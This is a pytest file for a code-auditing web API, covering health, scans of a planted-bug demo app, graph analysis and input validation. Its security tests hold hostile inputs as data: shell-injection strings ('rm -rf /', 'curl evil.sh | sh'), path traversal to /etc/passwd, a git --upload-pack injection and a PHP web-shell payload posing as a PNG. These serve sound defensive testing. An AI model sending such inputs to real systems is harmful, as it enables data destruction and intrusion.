"""API, security and graph-analysis tests for GemmaGraph Bug Hunter.

These tests never call the Gemini API: scans of ``demo_buggy_app`` are served
from the committed disk cache (``backend/.scan_cache.json``), and every security
test is rejected before any network or subprocess work happens.

Run:  python -m pytest -q
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

import main
from graph_engine import InvalidTargetError, summarize_graph, validate_target

client = TestClient(main.app)

PNG_SIG = b"\x89PNG\r\n\x1a\n"


@pytest.fixture(scope="module")
def demo_scan() -> dict:
    """Scan of the deliberately buggy demo app (served from the disk cache)."""
    res = client.post("/api/scan", json={"repo_url": "demo_buggy_app"})
    assert res.status_code == 200, res.text
    return res.json()


# --------------------------------------------------------------------------- #
# a) Health
# --------------------------------------------------------------------------- #

def test_health_returns_expected_schema() -> None:
    res = client.get("/api/health")
    assert res.status_code == 200
    body = res.json()
    for key in ("status", "uptime_seconds", "python_version", "model", "graphify", "disk_cache", "ready", "checks"):
        assert key in body, key
    assert body["model"] == "gemma-4-26b-a4b-it"
    assert body["graphify"]["installed"] is True
    assert isinstance(body["disk_cache"]["cached_scans"], int)
    assert res.headers["cache-control"] == "public, max-age=300"


def test_dashboard_is_served() -> None:
    res = client.get("/")
    assert res.status_code == 200
    assert "GemmaGraph Bug Hunter" in res.text
    assert '<script type="module" src="/static/js/main.js">' in res.text


@pytest.mark.parametrize(
    "path, content_type",
    [("/static/js/main.js", "javascript"), ("/static/js/render.js", "javascript"), ("/static/css/styles.css", "text/css")],
)
def test_dashboard_assets_are_served_and_cacheable(path: str, content_type: str) -> None:
    res = client.get(path)
    assert res.status_code == 200
    assert content_type in res.headers["content-type"]
    assert res.headers["cache-control"] == "public, max-age=300"


def test_static_mount_blocks_traversal() -> None:
    res = client.get("/static/../backend/main.py")
    assert res.status_code == 404
    res = client.get("/static/%2e%2e/.env")
    assert res.status_code == 404


# --------------------------------------------------------------------------- #
# b) Scan
# --------------------------------------------------------------------------- #

def test_scan_demo_app_returns_full_audit(demo_scan: dict) -> None:
    audit = demo_scan["audit"]
    for key in ("security_hotspots", "circular_dependencies", "dead_code", "git_diff_patch"):
        assert key in audit, key
    assert audit["security_hotspots"], "demo app has planted vulnerabilities"
    assert audit["git_diff_patch"].startswith("---")


def test_scan_demo_app_graph_detects_planted_bugs(demo_scan: dict) -> None:
    graph = demo_scan["graph_summary"]
    cycles = [set(c["files"]) for c in graph["circular_dependencies"]]
    assert {"auth.py", "db.py"} in cycles
    dead = {n["label"] for n in graph["dead_code"]["unreferenced_callables"]}
    assert "load_legacy_session()" in dead
    severities = {str(h["severity"]).lower() for h in demo_scan["audit"]["security_hotspots"]}
    assert "critical" in severities


def test_cached_scan_is_fast_and_http_cacheable() -> None:
    res = client.post("/api/scan", json={"repo_url": "demo_buggy_app"})
    assert res.status_code == 200
    assert res.json()["cached"] is True
    assert res.json()["latency_ms"] < 50
    assert res.headers["cache-control"] == "public, max-age=300"


def test_get_scan_by_id(demo_scan: dict) -> None:
    res = client.get(f"/api/scan/{demo_scan['scan_id']}")
    assert res.status_code == 200
    assert res.json()["repo"] == "demo_buggy_app"


# --------------------------------------------------------------------------- #
# c) Security
# --------------------------------------------------------------------------- #

MALICIOUS_TARGETS = [
    "https://evil.com/repo; rm -rf /",
    "https://github.com/psf/requests; rm -rf /",
    "https://github.com/psf/requests && curl evil.sh | sh",
    "$(touch /tmp/pwned)",
    "`id`",
    "../../etc/passwd",
    "/etc",
    "C:\\Windows\\System32",
    "backend",
    "demo_buggy_app/../backend",
    "file:///etc/passwd",
    "git@github.com:psf/requests.git",
    "http://github.com/psf/requests",
    "https://user:token@github.com/psf/requests",
    "https://github.com/psf/requests?ref=main",
    "https://github.com/a/..",
    "--upload-pack=touch /tmp/pwned",
    "https://github.com/" + "a" * 300,
]


@pytest.mark.parametrize("target", MALICIOUS_TARGETS)
def test_malicious_scan_targets_are_rejected(target: str) -> None:
    res = client.post("/api/scan", json={"repo_url": target})
    assert res.status_code in (400, 422), res.text
    body = res.json()
    assert body["status"] == "error"
    assert "error" in body
    assert "Traceback" not in res.text


def test_validate_target_accepts_only_allowlist() -> None:
    assert validate_target(".").key == "."
    assert validate_target("demo_buggy_app").key == "demo_buggy_app"
    assert validate_target("https://github.com/PSF/Requests.git").key == "https://github.com/psf/requests"
    with pytest.raises(InvalidTargetError):
        validate_target("https://gitlab.com/a/b")


def test_upload_rejects_disallowed_mime(demo_scan: dict) -> None:
    res = client.post(
        "/api/multimodal-audit",
        data={"scan_id": demo_scan["scan_id"]},
        files={"image": ("x.gif", b"GIF89a....", "image/gif")},
    )
    assert res.status_code == 415
    assert res.json()["status"] == "error"


def test_upload_rejects_spoofed_content_type(demo_scan: dict) -> None:
    res = client.post(
        "/api/multimodal-audit",
        data={"scan_id": demo_scan["scan_id"]},
        files={"image": ("evil.png", b"<?php system($_GET['c']); ?>", "image/png")},
    )
    assert res.status_code == 415


def test_upload_rejects_oversized_file(demo_scan: dict) -> None:
    payload = PNG_SIG + b"\x00" * (5 * 1024 * 1024)
    res = client.post(
        "/api/multimodal-audit",
        data={"scan_id": demo_scan["scan_id"]},
        files={"image": ("big.png", payload, "image/png")},
    )
    assert res.status_code == 413


def test_upload_requires_known_scan() -> None:
    res = client.post(
        "/api/multimodal-audit",
        data={"scan_id": "000000000000"},
        files={"image": ("d.png", PNG_SIG + b"\x00" * 32, "image/png")},
    )
    assert res.status_code == 404
    assert res.json() == {"error": "Unknown scan_id - run POST /api/scan first", "status": "error"}


def test_unexpected_errors_return_clean_json(monkeypatch: pytest.MonkeyPatch) -> None:
    def boom(_: str) -> None:
        raise RuntimeError("secret internal detail")

    monkeypatch.setattr(main, "_get_cached", boom)
    res = TestClient(main.app, raise_server_exceptions=False).get("/api/scan/abcdefabcdef")
    assert res.status_code == 500
    assert res.json() == {"error": "Internal server error", "status": "error"}
    assert "secret internal detail" not in res.text


# --------------------------------------------------------------------------- #
# Graph analysis (pure function, no Graphify subprocess)
# --------------------------------------------------------------------------- #

def test_summarize_graph_finds_cycle_god_node_and_dead_code() -> None:
    def node(nid: str, f: str, callable_: bool = False) -> dict:
        return {"id": nid, "label": f"{nid}()" if callable_ else f, "source_file": f, "_callable": callable_}

    def edge(s: str, t: str, rel: str) -> dict:
        return {"source": s, "target": t, "relation": rel, "confidence": "EXTRACTED"}

    graph = {
        "nodes": [node("a", "a.py"), node("b", "b.py"), node("c", "c.py"),
                  node("hub", "b.py", True), node("orphan", "c.py", True)],
        "links": [edge("a", "hub", "imports"), edge("b", "a", "imports"), edge("c", "hub", "calls"),
                  edge("b", "hub", "contains"), edge("c", "orphan", "contains")],
    }
    summary = summarize_graph(graph)
    assert summary["god_nodes"][0]["id"] == "hub"
    assert summary["circular_dependencies"][0]["files"] == ["a.py", "b.py"]
    assert [n["id"] for n in summary["dead_code"]["unreferenced_callables"]] == ["orphan"]
    assert any(e["in_cycle"] for e in summary["file_graph"]["edges"])
